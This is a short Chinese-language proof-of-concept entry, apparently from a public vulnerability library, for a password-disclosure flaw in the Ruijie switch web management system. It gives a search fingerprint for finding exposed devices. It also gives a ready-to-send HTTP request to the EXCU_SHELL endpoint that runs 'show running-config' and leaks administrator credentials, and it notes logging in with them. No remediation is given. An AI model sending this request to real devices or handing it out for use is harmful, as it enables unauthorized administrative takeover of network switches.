---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 锐捷交换机WEB管理系统EXCU_SHELL密码信息泄漏漏洞

# 一、漏洞简介
<font style="color:rgb(31, 35, 40);">锐捷交换机 WEB 管理系统 EXCU_SHELL存在密码信息泄露漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。</font>

# 二、影响版本
+ <font style="color:rgb(31, 35, 40);">锐捷交换机 WEB 管理系统</font>

# <font style="color:rgb(31, 35, 40);">三、资产测绘</font>
+ hunter`web.body="img/free_login_ge.gif"&&web.body="./img/login_bg.gif"`
+ 登录页面


# 四、漏洞复现
```plain
GET /EXCU_SHELL HTTP/1.1
Cmdnum: 1
Command1: show running-config
Confirm1: n
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


使用获取的账号密码成功登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hzkmpfxiryxd4dnp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
